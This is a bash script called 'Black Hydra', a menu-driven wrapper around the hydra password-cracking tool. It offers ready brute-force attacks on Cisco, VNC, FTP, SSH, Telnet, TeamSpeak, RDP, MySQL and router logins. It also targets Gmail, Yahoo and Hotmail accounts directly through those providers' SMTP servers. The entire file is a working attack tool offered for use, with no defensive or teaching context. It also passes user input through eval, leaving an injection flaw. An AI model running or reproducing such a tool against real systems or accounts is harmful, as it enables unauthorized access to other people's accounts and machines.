#!/usr/bin/bash
clear
bhydra_cisco=$(cat <<DOCUMENT

          +---------------------------+
          |     Cisco Brute Force     |
          +---------------------------+
DOCUMENT
)
bhydra_vnc=$(cat <<DOCUMENT

          +---------------------------+
          |      VNC Brute Force      |
          +---------------------------+
DOCUMENT
)
bhydra_ftp=$(cat <<DOCUMENT

          +------------------------------+
          |        FTP Brute Force       |
          +------------------------------+
DOCUMENT
)
bhydra_gmail=$(cat <<DOCUMENT

          +------------------------------+
          |       Gmail Brute Force      |
          +------------------------------+
DOCUMENT
)
bhydra_ssh=$(cat <<DOCUMENT

         +--------------------------------+
         |        SSH Brute Force         |
         +--------------------------------+
DOCUMENT
)
bhydra_teamspeak=$(cat <<DOCUMENT

        +-------------------------+
        |  TeamSpeak Brute Force  |
        +-------------------------+
DOCUMENT
)
bhydra_telnet=$(cat <<DOCUMENT

        +-------------------------+
        |   Telnet Brute Force    |
        +-------------------------+
DOCUMENT
)
bhydra_yahoo=$(cat <<DOCUMENT

          +---------------------------+
          |     Yahoo Brute Force     |
          +---------------------------+
DOCUMENT
)
bhydra_hotmail=$(cat <<DOCUMENT

          +----------------------------+
          |    Hotmail Brute Force     |
          +----------------------------+
DOCUMENT
)
bhydra_router_speedy=$(cat <<DOCUMENT

        +-----------------------------+
        |  Router Speedy Brute Force  |
        +-----------------------------+
DOCUMENT
)
bhydra_rdp=$(cat <<DOCUMENT

        +----------------------------+
        |      RDP Brute Force       |
        +----------------------------+
DOCUMENT
)
bhydra_mysql=$(cat <<DOCUMENT

        +-----------------------------+
        |       MySQL Brute Force     |
        +-----------------------------+
DOCUMENT
)
bhydra_banner=$(cat <<DOCUMENT
___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____
|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|
|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |
-----------------------------------------------------
[]xxxxx[]::::::::::::::::::::> 20-07-2020 (17:01)
 [*] Author: Gameye98/DedSecTL  ---  [*] Version 1.1
c=={:::::::::::::::> Black Hydra Console
 [*] My FB : https://m.facebook.com/Gameye98
(}xxx{):::::::::> BlackHole Security

              ===|[ Brute Force ]|===

  [01] Cisco Brute Force
  [02] VNC Brute Force
  [03] FTP Brute Force
  [04] Gmail Brute Force
  [05] SSH Brute Force
  [06] TeamSpeak Brute Force
  [07] Telnet Brute Force
  [08] Yahoo Mail Brute Force
  [09] Hotmail Brute Force
  [10] Router Speedy Brute Force
  [11] RDP Brute Force
  [12] MySQL Brute Force
  [13] Restart the Program

 [00] Exit
DOCUMENT
)
function bhydraLogWarn {
	echo -e "[!] Warning: Dont leave the input empty!"
	echo -e "[!] If input empty, it'll break the current iteration!"
}
function inputIsEmpty {
	bhydraUserInput="${#1}"
	bhydraUInputLen=$(printf "%${bhydraUserInput}s" | tr "\n" " ")
	if [[ "$1" == "" || "$1" == "${bhydraUInputLen}" ]]; then
		echo -e "continue 1"
	else
		echo -e "true"
	fi
}
function main_c {
	printf "${bhydra_banner}\n\n"
	while true; do
		read -p "[*] B-Hydra > exec_num " bhydra
		# Cisco Brute Force
		if [[ "${bhydra}" == "00" || "${bhydra}" == "0" ]]; then
			exit
		elif [[ "${bhydra}" == "01" || "${bhydra}" == "1" ]]; then
			printf "${bhydra_cisco}\n\n"
			bhydraLogWarn
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -P "${bhydra_word}" "${bhydra_iphost}" cisco
		# VNC Brute Force
		elif [[ "${bhydra}" == "02" || "${bhydra}" == "2" ]]; then
			printf "${bhydra_vnc}\n\n"
			bhydraLogWarn
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost} host)"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -P "${bhydra_word}" -e n -t 1 "${bhydra_iphost}" vnc -V
		# FTP Brute Force
		elif [[ "${bhydra}" == "03" || "${bhydra}" == "3" ]]; then
			printf "${bhydra_ftp}\n\n"
			bhydraLogWarn
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_user}" -P "${bhydra_word}" "${bhydra_iphost}" ftp
		# Gmail Brute Force
		elif [[ "${bhydra}" == "04" || "${bhydra}" == "4" ]]; then
			printf "${bhydra_gmail}\n\n"
			bhydraLogWarn
			read -p "[*] Email : " bhydra_email
			eval "$(inputIsEmpty ${bhydra_email})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_email}" -P "${bhydra_word}" -s 465 smtp.gmail.com smtp
		# SSH Brute Force
		elif [[ "${bhydra}" == "05" || "${bhydra}" == "5" ]]; then
			printf "${bhydra_ssh}\n\n"
			bhydraLogWarn
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_user}" -P "${bhydra_word}" "${bhydra_iphost}" ssh
		# TeamSpeak Brute Force
		elif [[ "${bhydra}" == "06" || "${bhydra}" == "6" ]]; then
			printf "${bhydra_teamspeak}\n\n"
			bhydraLogWarn
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_user}" -P "${bhydra_word}" -s 8676 "${bhydra_iphost}" teamspeak
		# Telnet Brute Force
		elif [[ "${bhydra}" == "07" || "${bhydra}" == "7" ]]; then
			printf "${bhydra_telnet}\n\n"
			bhydraLogWarn
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_user}" -P "${bhydra_word}" "${bhydra_iphost}" telnet
		# Yahoo Brute Force
		elif [[ "${bhydra}" == "08" || "${bhydra}" == "8" ]]; then
			printf "${bhydra_yahoo}\n\n"
			read -p "[*] Email : " bhydra_email
			eval "$(inputIsEmpty ${bhydra_email})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_email}" -P "${bhydra_word}" -s 587 smtp.mail.yahoo.com smtp
		# Hotmail Brute Force
		elif [[ "${bhydra}" == "09" || "${bhydra}" == "9" ]]; then
			printf "${bhydra_hotmail}\n\n"
			read -p "[*] Email : " bhydra_email
			eval "$(inputIsEmpty ${bhydra_email})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -l "${bhydra_email}" -P "${bhydra_word}" -s 587 smtp.live.com smtp
		# Router Speedy Brute Force
		elif [[ "${bhydra}" == "10" ]]; then
			printf "${bhydra_router_speedy}\n\n"
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -m / -l "${bhydra_user}" -P "${bhydra_word}" "${bhydra_iphost}" http-get
		# RDP Brute Force
		elif [[ "${bhydra}" == "11" ]]; then
			printf "${bhydra_rdp}\n\n"
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] IP/Hostname : " bhydra_iphost
			eval "$(inputIsEmpty ${bhydra_iphost})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word})"
			hydra -t 1 -V -f -l "${bhydra_user}" -P "${bhydra_word}" "${bhydra_iphost}" rdp
		# MySQL Brute Force
		elif [[ "${bhydra}" == "12" ]]; then
			printf "${bhydra_mysql}\n\n"
			read -p "[*] User : " bhydra_user
			eval "$(inputIsEmpty ${bhydra_user})"
			read -p "[*] Wordlist : " bhydra_word
			eval "$(inputIsEmpty ${bhydra_word} word)"
			hydra -t 5 -V -f -l "${bhydra_user}" -e ns -P "${bhydra_word}" localhost mysql
		elif [[ "${bhydra}" == "13" ]]; then
			clear
			printf "${bhydra_banner}\n\n"
		else
			eval true
		fi
	done
}
if test -z "$(which hydra)"; then
	echo -e "[!] Warning: hydra package is not installed!"
	echo -e "[+] Installing hydra ..."
	apt update -y && apt upgrade -y
	apt install hydra -y
else
	main_c
fi
